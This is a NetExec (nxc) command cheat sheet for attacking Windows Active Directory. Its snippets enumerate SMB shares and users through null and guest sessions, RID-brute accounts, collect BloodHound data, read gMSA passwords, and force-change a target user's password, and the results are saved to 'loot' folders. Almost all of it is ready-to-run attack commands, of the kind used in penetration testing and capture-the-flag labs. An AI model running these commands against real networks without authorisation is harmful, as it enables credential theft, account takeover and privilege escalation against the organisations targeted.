# nxc

% nxc, netexec, windows, active directory

## nxc - set/generate hosts file
#plateform/linux #target/local #cat/CONFIGURATION

```bash
nxc smb <IP> --smb-timeout 5 --generate-hosts-file /etc/hosts
```

## nxc - set/generate krb5/realm file
#plateform/linux #target/local #cat/CONFIGURATION

```bash
nxc smb <IP> --smb-timeout 5 --generate-krb5-file /etc/krb5.conf
```

## nxc - sync time with domain controller, fixing clock skew error/issue
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT

```bash
faketime "$(rdate -n <IP> -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
```

## nxc - smb enumeration unauthenticated
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

```bash
mkdir -p loot/smb/unauth
TARGET=<IP>
nxc smb $TARGET -u 'a' -p '' --smb-timeout 10 --shares > $(pwd)/loot/smb/unauth/guest_shares.txt
nxc smb $TARGET -u 'a' -p '' --smb-timeout 10 --rid-brute > $(pwd)/loot/smb/unauth/guest_rid_brute.txt
nxc smb $TARGET -u 'a' -p '' --smb-timeout 10 --users > $(pwd)/loot/smb/unauth/guest_users.txt
nxc smb $TARGET -u '' -p '' --smb-timeout 10 --shares > loot/smb/unauth/null_shares.txt
nxc smb $TARGET -u '' -p '' --smb-timeout 10 --rid-brute > loot/smb/unauth/null_rid_brute.txt
nxc smb $TARGET -u '' -p '' --smb-timeout 10 --users > loot/smb/unauth/null_users.txt
unset TARGET
```

## nxc - smb enumeration authenticated
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
Note: <Creds_Options> can be -p (password), -H (NT hash), or -p -k (Kerberos ticket)

```bash
mkdir -p loot/smb/authenticated
IP=<IP>
USER=<Username>
CREDS=<Creds_Options|-p|-H|-p -k>
PASS=<Password>
nxc smb "$IP" -u "$USER" $CREDS "$PASS" --smb-timeout 10 --shares > $(pwd)/loot/smb/authenticated/shares.txt
nxc smb "$IP" -u "$USER" $CREDS "$PASS" --smb-timeout 10 --rid-brute > $(pwd)/loot/smb/authenticated/rid_brute.txt
nxc smb "$IP" -u "$USER" $CREDS "$PASS" --smb-timeout 10 --users > $(pwd)/loot/smb/authenticated/users.txt
echo "All information saved to loot/smb/authenticated/"
unset IP USER CREDS PASS
```

## nxc - enumerate host
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON
Example:
nxc smb 192.168.1.1
nxc smb 192.168.1.0/24
nxc smb ips.txt

https://www.netexec.wiki/

```bash
nxc smb <IP>
```

## nxc - null session shares
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT
Example:
nxc smb 192.168.1.1 -u '' -p '' --shares

https://www.netexec.wiki/

```bash
nxc smb <IP> -u '' -p '' --shares
```

## nxc - guest login shares
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT
Example:
nxc smb 192.168.1.1 -u 'a' -p '' --shares

https://www.netexec.wiki/

```bash
nxc smb <IP> -u 'a' -p '' --shares
```

## nxc - collect/ingest bloodhound
#plateform/linux #target/remote #port/389 #protocol/ldap #cat/RECON
Note: <Creds_Options> can be -p (password), -H (NT hash), or -p -k (Kerberos ticket)

```bash
IP=<IP>
nxc ldap "$IP" -u <Username> <Creds_Options|-p|-H|-p -k> <Password> --bloodhound -c All --dns-server $IP
```

## nxc - ReadGMSAPassword
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/PRIVILEGE-ESCALATION
Note: <Creds_Options> can be -p (password), -H (NT hash), or -p -k (Kerberos ticket)

```bash
nxc ldap <IP> -u <Username> <Creds_Options|-p|-H|-p -k> <Password> --gmsa
```

## nxc - ForceChangePassword
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/PRIVILEGE-ESCALATION
Note: <Creds_Options> can be -p (password), -H (NT hash), or -p -k (Kerberos ticket)

```bash
nxc smb <IP> -u <Username> <Creds_Options|-p|-H|-p -k> <Password> -M change-password -o USER=<Target_Username> NEWPASS=<New_Password>
```